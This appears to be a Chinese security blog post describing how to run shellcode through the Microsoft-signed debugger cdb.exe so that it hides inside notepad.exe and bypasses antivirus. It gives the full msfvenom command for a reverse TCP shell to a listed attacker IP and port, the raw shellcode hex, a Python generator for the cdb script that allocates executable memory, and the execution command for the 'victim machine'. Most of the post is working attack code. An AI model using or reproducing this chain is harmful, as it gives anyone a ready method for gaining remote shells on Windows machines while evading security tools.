---
title: cdb执行shellcode
tags: bypass
---

（程序以及脚本均上传github：https://github.com/Ryze-T/cdb-wds）

cdb 是安装 windows debugging tools 时自带的一个命令行调试工具，也是由微软签发证书：

![](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220323141141.png)

既然是调试工具，那就可以调试指定进程，且在指定进程里分配RWX属性内存并写入shellcode，最后执行该内存中的shellcode。

shell.wds的生成是有固定格式的，首先使用 msf 生成 reverse_tcp 类型的 shellcode

```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.80.138 LPORT=4444 -f c
```


去掉 \x 、" 等字符之后，保留原始 shellcode 字符，通过python 进行处理：

```Python
import binascii

# 处理过的shellcode 粘贴到这
buf = "fc4883e4f0e8cc000000415141505251564831d265488b5260488b5218488b5220480fb74a4a488b72504d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d0448b40204901d0508b4818e3564d31c948ffc9418b34884801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b048841584801d041585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d4831db5349be77696e696e65740041564889e149c7c24c772607ffd553534889e1535a4d31c04d31c9535349ba3a5679a700000000ffd5e80f0000003139322e3136382e38302e313338005a4889c149c7c05c1100004d31c953536a035349ba57899fc600000000ffd5e8370000002f46527848493070356b62776a53794a4a5158473264414852684154334150485657346f355873584f384d6263466c7972505a595a33004889c1535a41584d31c95348b8000228840000000050535349c7c2eb552e3bffd54889c66a0a5f535a4889f14d31c94d31c9535349c7c22d06187bffd585c0751f48c7c18813000049ba44f035e000000000ffd548ffcf7402ebcce85500000053596a405a4989d1c1e21049c7c00010000049ba58a453e500000000ffd5489353534889e74889f14889da49c7c0002000004989f949ba129689e200000000ffd54883c42085c074b2668b074801c385c075d258c3586a005949c7c2f0b5a256ffd5"

outfile = open("shell.wds","w")
outfile.write(".foreach /pS 5  ( register { .dvalloc 272 } ) { r @$t0 = register }"+"\n")
num = (int)(len(buf)/2)
count = 0

for i in range(num):
    flag = count%4
    if flag == 0:
        outfile.write("\n")
    if count < 16:
        sc_count = "0" + hex(count).upper()
    else:
        sc_count = hex(count).upper()
    x = ";eb @$t0+" + sc_count + " " + buf[i*2:i*2+2].upper()
    count = count + 1
    x= x.replace("0X","")
    outfile.write(x)
extra = num%4
if extra!=0:
    for j in range(4-extra):
        sc_count = hex(count).upper()
        count = count+1
        x = ";eb @$t0+" + sc_count + " 00"
        x = x.replace("0X", "")
        outfile.write(x)

outfile.write("\n" + "r @$ip=@$t0"+"\n")
outfile.write("g"+"\n")
outfile.write("g"+"\n")
outfile.write("q")
```


生成shell.wds文件后，将 cdb 和 wds 文件复制到被害机器中，执行：

```Bash
cdb.exe -pd -cf shell.wds -o notepad.exe
```


可以看到正常上线：

![](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220323141146.png)

查看受害机器进程：

![](https://gitee.com/tboom_is_here/pic/raw/master/2021-10-21/20220323141149.png)

可以看到是在 notepad 进程中存在 tcp 连接，隐蔽性相对较高，且由于shellcode没明显特征，cdb 有签名，因此免杀效果很好。



